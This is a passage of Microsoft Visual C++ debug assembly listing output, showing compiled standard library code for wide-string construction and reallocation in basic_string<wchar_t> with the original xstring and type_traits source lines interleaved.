  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 249  : #if _HAS_CXX20
; 250  :     if (_STD is_constant_evaluated()) {
; 251  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 252  :     } else
; 253  : #endif // _HAS_CXX20
; 254  :     {
; 255  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

  00024	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Obj$[rbp]
  0002b	e8 00 00 00 00	 call	 ??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ; std::addressof<wchar_t *>
  00030	48 8b d0	 mov	 rdx, rax
  00033	b9 08 00 00 00	 mov	 ecx, 8
  00038	e8 00 00 00 00	 call	 ??2@YAPEAX_KPEAX@Z	; operator new
  0003d	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00044	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]
  0004b	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR <_Args_0>$[rbp]
  00052	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00055	48 89 08	 mov	 QWORD PTR [rax], rcx

; 256  :     }
; 257  : }

  00058	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0005f	5f		 pop	 rdi
  00060	5d		 pop	 rbp
  00061	c3		 ret	 0
??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z ENDP ; std::_Construct_in_place<wchar_t *,wchar_t * &>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z
_TEXT	SEGMENT
_Val$ = 224
??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z PROC ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >, COMDAT

; 1583 : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__7C4A1519_type_traits
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1584 :     return __builtin_addressof(_Val);

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Val$[rbp]

; 1585 : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z ENDP ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
_TEXT	SEGMENT
_Old_capacity$ = 8
_New_capacity$ = 40
_Al$ = 72
_New_ptr$ = 104
__$ArrayPad$ = 312
this$ = 352
_New_size$ = 360
_Fn$ = 368
<_Args_0>$ = 376
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>, COMDAT

; 4778 :     _CONSTEXPR20 basic_string& _Reallocate_for(const size_type _New_size, _Fty _Fn, _ArgTys... _Args) {

$LN6:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	44 88 44 24 18	 mov	 BYTE PTR [rsp+24], r8b
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 68 01
	00 00		 sub	 rsp, 360		; 00000168H
  0001d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00022	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00027	b9 22 00 00 00	 mov	 ecx, 34			; 00000022H
  0002c	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00031	f3 ab		 rep stosd
  00033	48 8b 8c 24 88
	01 00 00	 mov	 rcx, QWORD PTR [rsp+392]
  0003b	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00042	48 33 c5	 xor	 rax, rbp
  00045	48 89 85 38 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0004c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00053	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4779 :         // reallocate to store exactly _New_size elements, new buffer prepared by
; 4780 :         // _Fn(_New_ptr, _New_size, _Args...)
; 4781 :         if (_New_size > max_size()) {

  00058	48 8b 8d 60 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0005f	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00064	48 39 85 68 01
	00 00		 cmp	 QWORD PTR _New_size$[rbp], rax
  0006b	76 05		 jbe	 SHORT $LN2@Reallocate

; 4782 :             _Xlen_string(); // result too long

  0006d	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Reallocate:

; 4783 :         }
; 4784 : 
; 4785 :         const size_type _Old_capacity = _Mypair._Myval2._Myres;

  00072	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00079	48 8b 40 18	 mov	 rax, QWORD PTR [rax+24]
  0007d	48 89 45 08	 mov	 QWORD PTR _Old_capacity$[rbp], rax

; 4786 :         size_type _New_capacity       = _Calculate_growth(_New_size);

  00081	48 8b 95 68 01
	00 00		 mov	 rdx, QWORD PTR _New_size$[rbp]
  00088	48 8b 8d 60 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0008f	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  00094	48 89 45 28	 mov	 QWORD PTR _New_capacity$[rbp], rax

; 4787 :         auto& _Al                     = _Getal();

  00098	48 8b 8d 60 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009f	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  000a4	48 89 45 48	 mov	 QWORD PTR _Al$[rbp], rax

; 4788 :         const pointer _New_ptr        = _Allocate_for_capacity(_Al, _New_capacity); // throws

  000a8	48 8d 55 28	 lea	 rdx, QWORD PTR _New_capacity$[rbp]
  000ac	48 8b 4d 48	 mov	 rcx, QWORD PTR _Al$[rbp]
  000b0	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  000b5	48 89 45 68	 mov	 QWORD PTR _New_ptr$[rbp], rax

; 4789 : 
; 4790 :         _Mypair._Myval2._Orphan_all();

  000b9	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000c0	48 8b c8	 mov	 rcx, rax
  000c3	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 4791 :         _ASAN_STRING_REMOVE(*this);
; 4792 :         _Mypair._Myval2._Mysize = _New_size;

  000c8	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000cf	48 8b 8d 68 01
	00 00		 mov	 rcx, QWORD PTR _New_size$[rbp]
  000d6	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 4793 :         _Mypair._Myval2._Myres  = _New_capacity;

  000da	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000e1	48 8b 4d 28	 mov	 rcx, QWORD PTR _New_capacity$[rbp]
  000e5	48 89 48 18	 mov	 QWORD PTR [rax+24], rcx

; 4794 :         _Fn(_Unfancy(_New_ptr), _New_size, _Args...);

  000e9	48 8b 4d 68	 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  000ed	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  000f2	4c 8b 8d 78 01
	00 00		 mov	 r9, QWORD PTR <_Args_0>$[rbp]
  000f9	4c 8b 85 68 01
	00 00		 mov	 r8, QWORD PTR _New_size$[rbp]
  00100	48 8b d0	 mov	 rdx, rax
  00103	48 8d 8d 70 01
	00 00		 lea	 rcx, QWORD PTR _Fn$[rbp]
  0010a	e8 00 00 00 00	 call	 ??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator()

; 4795 :         if (_Old_capacity > _Small_string_capacity) {

  0010f	48 83 7d 08 07	 cmp	 QWORD PTR _Old_capacity$[rbp], 7
  00114	76 27		 jbe	 SHORT $LN3@Reallocate

; 4796 :             _Deallocate_for_capacity(_Al, _Mypair._Myval2._Bx._Ptr, _Old_capacity);

  00116	4c 8b 45 08	 mov	 r8, QWORD PTR _Old_capacity$[rbp]
  0011a	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00121	48 8b 10	 mov	 rdx, QWORD PTR [rax]
  00124	48 8b 4d 48	 mov	 rcx, QWORD PTR _Al$[rbp]
  00128	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity

; 4797 :             _Mypair._Myval2._Bx._Ptr = _New_ptr;

  0012d	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00134	48 8b 4d 68	 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  00138	48 89 08	 mov	 QWORD PTR [rax], rcx

; 4798 :         } else {

  0013b	eb 13		 jmp	 SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4799 :             _Construct_in_place(_Mypair._Myval2._Bx._Ptr, _New_ptr);

  0013d	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00144	48 8d 55 68	 lea	 rdx, QWORD PTR _New_ptr$[rbp]
  00148	48 8b c8	 mov	 rcx, rax
  0014b	e8 00 00 00 00	 call	 ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
$LN4@Reallocate:

; 4800 :         }
; 4801 : 
; 4802 :         _ASAN_STRING_CREATE(*this);
; 4803 :         return *this;

  00150	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
$LN5@Reallocate:

; 4804 :     }

  00157	48 8b f8	 mov	 rdi, rax
  0015a	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  0015e	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcFrameData
  00165	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  0016a	48 8b c7	 mov	 rax, rdi
  0016d	48 8b 8d 38 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  00174	48 33 cd	 xor	 rcx, rbp
  00177	e8 00 00 00 00	 call	 __security_check_cookie
  0017c	48 8d a5 48 01
	00 00		 lea	 rsp, QWORD PTR [rbp+328]
  00183	5f		 pop	 rdi
  00184	5d		 pop	 rbp
  00185	c3		 ret	 0
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z
_TEXT	SEGMENT
$T1 = 196
this$ = 256
_New_ptr$ = 264
_Count$ = 272
_Ptr$ = 280
??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z PROC ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator(), COMDAT

; 3424 :             [](_Elem* const _New_ptr, const size_type _Count, const _Elem* const _Ptr) {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0001d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00022	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00029	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3425 :                 _Traits::copy(_New_ptr, _Ptr, _Count);

  0002e	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR _Count$[rbp]
  00035	48 8b 95 18 01
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  0003c	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  00043	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 3426 :                 _Traits::assign(_New_ptr[_Count], _Elem());

  00048	33 c0		 xor	 eax, eax
  0004a	66 89 85 c4 00
	00 00		 mov	 WORD PTR $T1[rbp], ax
  00051	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _New_ptr$[rbp]
  00058	48 8b 8d 10 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0005f	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  00063	48 8d 95 c4 00
	00 00		 lea	 rdx, QWORD PTR $T1[rbp]
  0006a	48 8b c8	 mov	 rcx, rax
  0006d	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 3427 :             },

  00072	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00079	5f		 pop	 rdi
  0007a	5d		 pop	 rbp
  0007b	c3		 ret	 0
??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z ENDP ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
_TEXT	SEGMENT
_My_data$ = 8
_Al$ = 40
_Alproxy$ = 72
_Proxy$ = 100
_New_capacity$ = 136
_New_ptr$ = 168
tv135 = 376
__$ArrayPad$ = 384
this$ = 432
_Arg$ = 440
_Count$ = 448
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>, COMDAT

; 2659 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN5:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec b8 01
	00 00		 sub	 rsp, 440		; 000001b8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00022	b9 36 00 00 00	 mov	 ecx, 54			; 00000036H
  00027	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0002c	f3 ab		 rep stosd
  0002e	48 8b 8c 24 d8
	01 00 00	 mov	 rcx, QWORD PTR [rsp+472]
  00036	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0003d	48 33 c5	 xor	 rax, rbp
  00040	48 89 85 80 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00047	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0004e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2660 :         auto& _My_data = _Mypair._Myval2;

  00053	48 8b 85 b0 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0005a	48 89 45 08	 mov	 QWORD PTR _My_data$[rbp], rax

; 2661 :         _STL_INTERNAL_CHECK(!_My_data._Large_mode_engaged());
; 2662 : 
; 2663 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2664 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2665 :         } else {
; 2666 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2667 :         }
; 2668 : 
; 2669 :         if (_Count > max_size()) {

  0005e	48 8b 8d b0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00065	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  0006a	48 39 85 c0 01
	00 00		 cmp	 QWORD PTR _Count$[rbp], rax
  00071	76 05		 jbe	 SHORT $LN2@Construct

; 2670 :             _Xlen_string(); // result too long

  00073	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Construct:

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();

  00078	48 8b 8d b0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00084	48 89 45 28	 mov	 QWORD PTR _Al$[rbp], rax

; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);

  00088	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
  0008f	48 89 45 48	 mov	 QWORD PTR _Alproxy$[rbp], rax

; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);

  00093	4c 8b 45 08	 mov	 r8, QWORD PTR _My_data$[rbp]
  00097	48 8b 55 48	 mov	 rdx, QWORD PTR _Alproxy$[rbp]
  0009b	48 8d 4d 64	 lea	 rcx, QWORD PTR _Proxy$[rbp]
  0009f	e8 00 00 00 00	 call	 ??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  000a4	48 83 bd c0 01
	00 00 07	 cmp	 QWORD PTR _Count$[rbp], 7
  000ac	77 42		 ja	 SHORT $LN3@Construct

; 2678 :             _My_data._Mysize = _Count;

  000ae	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000b2	48 8b 8d c0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  000b9	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  000bd	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000c1	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 2680 : 
; 2681 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2682 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2683 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2684 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2685 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count);
; 2686 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2687 :             } else { // _Strat == _Construct_strategy::_From_string
; 2688 : #ifdef _INSERT_STRING_ANNOTATION
; 2689 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count + 1);
; 2690 : #else // ^^^ _INSERT_STRING_ANNOTATION / !_INSERT_STRING_ANNOTATION vvv
; 2691 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _BUF_SIZE);

  000c9	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000cd	41 b8 08 00 00
	00		 mov	 r8d, 8
  000d3	48 8b 95 b8 01
	00 00		 mov	 rdx, QWORD PTR _Arg$[rbp]
  000da	48 8b c8	 mov	 rcx, rax
  000dd	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 2692 : #endif // ^^^ !_INSERT_STRING_ANNOTATION ^^^
; 2693 :             }
; 2694 : 
; 2695 :             _Proxy._Release();

  000e2	48 8d 4d 64	 lea	 rcx, QWORD PTR _Proxy$[rbp]
  000e6	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2696 :             return;

  000eb	e9 ae 00 00 00	 jmp	 $LN1@Construct
$LN3@Construct:

; 2697 :         }
; 2698 : 
; 2699 :         size_type _New_capacity = _Calculate_growth(_Count, _Small_string_capacity, max_size());

  000f0	48 8b 8d b0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f7	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  000fc	4c 8b c0	 mov	 r8, rax
  000ff	ba 07 00 00 00	 mov	 edx, 7
  00104	48 8b 8d c0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0010b	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  00110	48 89 85 88 00
	00 00		 mov	 QWORD PTR _New_capacity$[rbp], rax

; 2700 :         const pointer _New_ptr  = _Allocate_for_capacity(_Al, _New_capacity); // throws

  00117	48 8d 95 88 00
	00 00		 lea	 rdx, QWORD PTR _New_capacity$[rbp]
  0011e	48 8b 4d 28	 mov	 rcx, QWORD PTR _Al$[rbp]
  00122	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  00127	48 89 85 a8 00
	00 00		 mov	 QWORD PTR _New_ptr$[rbp], rax

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  0012e	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00132	48 8d 95 a8 00
	00 00		 lea	 rdx, QWORD PTR _New_ptr$[rbp]
  00139	48 8b c8	 mov	 rcx, rax
  0013c	e8 00 00 00 00	 call	 ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>

; 2702 : 
; 2703 :         _My_data._Mysize = _Count;

  00141	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00145	48 8b 8d c0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0014c	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 2704 :         _My_data._Myres  = _New_capacity;

  00150	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00154	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR _New_capacity$[rbp]
  0015b	48 89 48 18	 mov	 QWORD PTR [rax+24], rcx

; 2705 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2706 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2707 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2708 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2709 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);
; 2710 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2711 :         } else { // _Strat == _Construct_strategy::_From_string
; 2712 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);

  0015f	48 8b 85 c0 01
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00166	48 ff c0	 inc	 rax
  00169	48 89 85 78 01
	00 00		 mov	 QWORD PTR tv135[rbp], rax
  00170	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  00177	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  0017c	48 8b 8d 78 01
	00 00		 mov	 rcx, QWORD PTR tv135[rbp]
  00183	4c 8b c1	 mov	 r8, rcx
  00186	48 8b 95 b8 01
